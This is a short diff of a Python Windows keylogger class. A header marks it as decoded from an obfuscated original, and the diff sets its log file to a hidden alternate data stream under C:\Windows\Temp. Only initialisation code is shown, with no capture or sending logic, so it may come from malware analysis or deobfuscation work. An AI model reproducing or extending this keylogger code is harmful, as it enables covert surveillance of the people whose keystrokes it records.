@@ -1,3 +1,7 @@
+#!/usr/bin/env python3
+# Decoded from Configuration/st_win_keylogger.py
+# Original was obfuscated with exec(SEC(INFO(...)))
+
 
 import os
 import sys
@@ -19,7 +23,7 @@ class keylogger():
         self.kl_status = False
         self.frz_status = False
         self.active_window = ''
-        self.log_file = r'C:\Windows\Temp:stkl.log'
+        self.log_file = 'C:\Windows\Temp:stkl.log'
 
     def start(self):
         kl_summary = ''
